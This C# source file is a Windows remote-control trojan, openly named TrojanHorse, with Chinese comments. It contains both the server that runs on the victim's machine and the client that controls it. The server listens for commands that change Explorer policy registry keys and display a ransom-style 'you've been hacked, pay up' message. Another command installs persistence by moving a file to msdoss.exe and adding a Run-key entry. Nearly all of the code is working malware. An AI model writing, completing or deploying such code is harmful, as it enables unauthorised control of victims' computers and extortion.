using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Aver3.Win
{
    public partial class TrojanHorse : Form
    {
        TcpListener listener;
        string mystr = "您好！";
        RegistryKey rrr = Registry.LocalMachine;
        RegistryKey key1;               //打开注册表

        TcpClient client;//客户端
        NetworkStream stream;
        Thread ssss;
        string zhucex = "zx0000";
        string zhuces = "zx0000";
        string mumawe = "zx0000";
        string jingga = "zx0000";
        string jianyi = "zx0000";
        string xiezai = "zx0000";
        string control = "zx0000";
        public TrojanHorse()
        {
            InitializeComponent();
            //加入侦听代码
            //端口可以自己设定，使用固定端口
            int port = 80;
            //IPAddress add = new IPAddress();
            listener = new TcpListener(port);
            listener.Start();
            Thread t = new Thread(new ThreadStart(target));
            t.Start();
        }
        //木马执行内容部分
        void target()
        {
            Socket socket = listener.AcceptSocket();
            while (socket.Connected)
            {
                byte[] b = new byte[6];
                int i = socket.Receive(b, b.Length, 0);
                string ss = Encoding.ASCII.GetString(b);

                //以下是修改注册表
                if (ss=="jiance")
                {
                    string s = "hjc";
                    byte[] byte1 = Encoding.ASCII.GetBytes(s.ToCharArray());
                    socket.Send(byte1, byte1.Length, 0);
                }
                if (ss == "zx0100")
                {
                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
                        key1.SetValue("NoClose", 1);
                        key1.Close();
                        mystr += "LocalMachine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer键值NoClose被修改！请将它置为0！";
                    }
                    catch (Exception)
                    {
                        if (key1 == null)
                        {
                            try
                            {
                                RegistryKey key2 = rrr.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",true);
                                key2.SetValue("NoClose", 1);
                                key2.Close();
                                mystr += "LocalMachine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer键值NoClose被修改！请将它置为0！";
                            }
                            catch { }
                        }
                        string str = "hkz";
                        byte[] bytee =  Encoding.ASCII.GetBytes(str.ToCharArray());
                        socket.Send(bytee, bytee.Length, 0);
                    }

                }
                //以下是善意修改部分
                if (ss == "zs0100")
                {
                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
                        key1.SetValue("NoClose", 0);
                        key1.Close();
                    }
                    catch {}
                    if (key1 == null)
                    {
                        try
                        {
                            RegistryKey key2 = rrr.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
                            key2.SetValue("NoClose", 0);
                            key2.Close();
                            mystr += "LocalMachine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer键值NoClose被修改！已将它置为0！";
                        }
                        catch { }
                    }
                    string str = "hkz";
                    byte[] bytee = Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是警告
                if (ss == "jg0000")
                {
                    MessageBox.Show("你被我黑了！交钱吧！");
                    string str = "hkz";
                    byte[] bytee = Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是建议
                if (ss == "jy0000")
                {
                    MessageBox.Show("你被我黑了！交钱吧！");
                    string str = "hkz";
                    byte[] bytee = Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是修改木马位置
                if (ss == "mw1000")
                {
                    try
                    {
                        File.Move("c:\\winnt\\system\\explorer.exe", "c:\\winnt\\system32\\msdoss.exe");
                    }
                    catch { }
                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key1.SetValue("msdoss", "c:\\winnt\\system32\\msdoss.exe");
                        key1.Close();
                    }
                    catch { }
                    if (key1 == null)
                    {
                        try
                        {
                            RegistryKey key2 = rrr.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                            key2.SetValue("msdoss", "c:\\winnt\\system32\\msdoss.exe");
                            key2.Close();
                        }
                        catch { }
                    }
                    string str = "hkz";
                    byte[] bytee = Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是卸载木马
                if (ss == "xz0000")
                {
                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        try { key1.DeleteValue("explorer"); } catch { }
                        try { key1.DeleteValue("msdoss"); } catch { }
                        try { key1.DeleteValue("microsoft"); } catch { }
                        key1.Close();
                    }
                    catch { }
                    string str = "hkz";
                    byte[] bytee = Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
            }
        }
        //控制部分
        void receive()
        {
            byte[] bb = new byte[3];
            int i = stream.Read(bb,0,3);
            string ss = Encoding.ASCII.GetString(bb);
            if (ss== "hjc")
            {
                MessageBox.Show("连接成功！");
                richTextBox1.AppendText("与"+textBox1.Text+"连接成功。\r");
            }
            if (ss == "hkz")
            {
                MessageBox.Show("控制成功！");
                richTextBox1.AppendText(control + "控制成功。\r");
            }
        }
        void ControlServer()
        {
            if (control == "000000")
            {
                MessageBox.Show("您没有选择控制任何目标！");
                richTextBox1.AppendText("没有找到对象控制。\r");
            }
            else
            {
                try
                {
                    richTextBox1.AppendText(control + "正在试图控制，等待回应。。。。。\r");
                    stream = client.GetStream();
                    if (stream.CanWrite)
                    {
                        byte[] by = Encoding.ASCII.GetBytes(control.ToCharArray());
                        stream.Write(by,0,by.Length);
                        stream.Flush();
                        ssss = new Thread(new ThreadStart(receive));
                        ssss.Start();
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("服务器未连接！控制无效!");
                    richTextBox1.AppendText("服务器未连接！控制无效。\r");
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int port = 6678;
            richTextBox1.AppendText("请求连接" + textBox1.Text + "\r");

            try
            {
                client = new TcpClient(textBox1.Text,port);
            }
            catch (Exception)
            {
                MessageBox.Show("服务器不在线上！确定是否未输入主机名称!");
                richTextBox1.AppendText("服务器不在线上！确定是否未输入主机名称!\r");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            richTextBox1.AppendText("测试连接" + "\r");
            try
            {
                stream = client.GetStream();
                if (stream.CanWrite)
                {
                    string control = "jiance";
                    byte[] by = Encoding.ASCII.GetBytes(control.ToCharArray());
                    stream.Write(by, 0, by.Length);
                    stream.Flush();
                    ssss = new Thread(new ThreadStart(receive));
                    ssss.Start();
                }
            }
            catch (Exception ee)
            {
                MessageBox.Show(ee.Message);
                richTextBox1.AppendText(ee.Message+"\r");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            zhucex = "zx0100";
            control = zhucex;
            ControlServer();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            zhuces = "zs0100";
            control = zhuces;
            ControlServer();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            jingga = "jg0000";
            control = jingga;
            ControlServer();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            jianyi = "jy0000";
            control = jianyi;
            ControlServer();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            mumawe = "mw1000";
            control = mumawe;
            ControlServer();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            xiezai = "xz0000";
            control = xiezai;
            ControlServer();
        }
    }
}
